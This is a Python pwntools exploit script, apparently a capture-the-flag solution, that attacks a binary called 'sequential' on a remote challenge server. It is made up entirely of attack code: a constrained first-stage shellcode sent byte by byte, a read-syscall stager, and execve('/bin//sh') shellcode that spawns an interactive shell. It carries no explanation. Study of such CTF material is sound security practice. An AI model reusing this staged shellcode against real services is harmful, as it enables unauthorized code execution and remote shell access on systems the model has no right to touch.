#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *

context.update(arch="amd64", os="linux")
context.log_level = 'debug'

exe = ELF('./sequential')

host, port = "host.cg21.metaproblems.com", "3340"

if args.REMOTE:
  p = remote(host,port)
else:
  p = process(exe.path)

shellc = asm('''
begin:
  add al,5
  or byte ptr[rdx],cl
  and al,0x28
  push rax
  push rcx
  push rbx
  pop rax
  pop rdx
  pop rsi
  jno begin
  .byte 0xf5,0xf6

''')

print(hexdump(shellc))

payload = shellc
p.sendlineafter('bytes?\n', str(len(payload)))


for i in payload:
  p.sendlineafter('> ', str(ord(i)))

shellc2 = asm('''
  .byte 0xf,0x05
  xor eax,eax
  push 0x40
  pop rdx
  syscall
''')

p.send(shellc2.ljust(15,'\x90'))

shellc3 = asm('''
  .byte 0x90,0x90,0x90,0x90,0x90,0x90, 0x90,0x90,0x90
  xor esi, esi
  push rsi
  mov rbx, 0x68732f2f6e69622f
  push rbx
  push rsp
  pop rdi
  imul esi
  mov al, 0x3b
  syscall
''')

p.send(shellc3)

p.interactive()

